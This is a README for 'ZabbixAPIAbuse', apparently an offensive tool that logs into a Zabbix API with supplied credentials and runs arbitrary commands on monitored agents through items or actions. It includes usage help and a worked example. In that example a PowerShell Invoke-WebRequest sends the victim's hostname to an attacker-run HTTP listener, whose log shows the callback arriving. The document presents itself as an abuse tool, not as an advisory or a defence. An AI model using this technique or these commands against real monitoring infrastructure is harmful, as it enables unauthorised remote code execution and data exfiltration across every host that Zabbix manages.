# ZabbixAPIAbuse
ZabbixAPIAbuse is an abusing tool for Zabbix API to execute commands on zabbix agents.

## Requirements
```bash
pip3 install -r requirements.txt
```

## Help

```bash
python3 ZabbixAPIAbuse.py -h
usage: ZabbixAPIAbuse.py [-h] --url  -c  -m  -u  -p

Zabbix goes brrrrr

options:
  -h, --help        show this help message and exit
  --url             url to target (Ex : http://192.168.1.1/zabbix/api_jsonrpc.php )
  -c , --cmd        Command to execute
  -m , --method     Method to use (action / item)
  -u , --user       Username of the zabbix user
  -p , --password   Password for the zabbix user
```

## Example
```bash
┌──(zabbix@abuse)-[~]
└─$ ZabbixAPIAbuse.py --url 'http://10.9.10.16/zabbix/api_jsonrpc.php' -c 'powershell -c "Invoke-WebRequest -Uri http://192.168.1.100/$(hostname)"' -m 'item' -u 'admin' -p 'password'

[0]: COMPUTER1
[1]: COMPUTER2
Host num: 0
[0]: 192.168.1.108
Interface num: 0
[*] Waiting for execution ...
[*] Execution done
[*] Items deleted
```

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
192.168.1.108 - - [11/May/2020 13:36:23] "GET /COMPUTER1 HTTP/1.1" 404 -
```